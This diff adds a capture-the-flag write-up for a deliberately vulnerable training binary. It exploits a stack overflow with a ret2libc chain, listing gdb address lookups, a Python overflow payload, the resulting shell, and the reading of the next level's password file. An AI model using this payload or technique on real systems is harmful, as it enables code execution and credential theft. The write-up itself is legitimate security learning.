@@ -1,0 +1,50 @@
+# When looking a source we see that we can overflow the
+	int1 variable from char1 and then overflow the ret address
+
+STACK:
+	+---------------------+
+          RET ADDRESS
+	+---------------------+
+             INT1
+	+---------------------+
+             CHAR1
+	+---------------------+
+
+# We will be able to enter the condition if ((int1 & 0xb0000000) == 0xb0000000)
+# Well, i don't care :D idk if we can perform an exploit string exploit on this
+	printf but this isn't how i solved it
+
+# I'll write over the RET VALUE stored on the stack when main called p()
+	So when p will end and ret, it will jump to my function
+
+# We must not enter the condition so we can't direclty system('/bin/sh')
+	Because system's address is: 0xb7e6b060, it'll enter in the if statement
+	and exit.
+
+=================================================================================
+# I built a ROP chain :) In order to perform a ret2libc attack
+(gdb) b system -> Breakpoint 1 at 0xb7e6b060
+(gdb) find &system,+9999999,"/bin/sh" -> 0xb7f8cc58
+
+# We have the address of system and the address of /bin/sh
+system =  0xb7e6b060
+/bin/sh = 0xb7f8cc58
+
+# Since we can't direclty use system(/bin/sh) we must call an useless function
+	That isn't starting with address 0xb7
+
+# The chosen one is puts
+(gdb) info func
+[...]
+0x080483f0  puts
+[...]
+
+python -c 'print "\x41"*80+"\xf0\x83\x04\x08"+"\xf0\x83\x04\x08"+"\x60\xb0\xe6\xb7"+"\x58\xcc\xf8\xb7"*2' > /tmp/j
+level2@SnowCrash:~$ cat /tmp/j - | ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��`��X���X���
+���t$�t$ �\$���
+/bin/sh
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
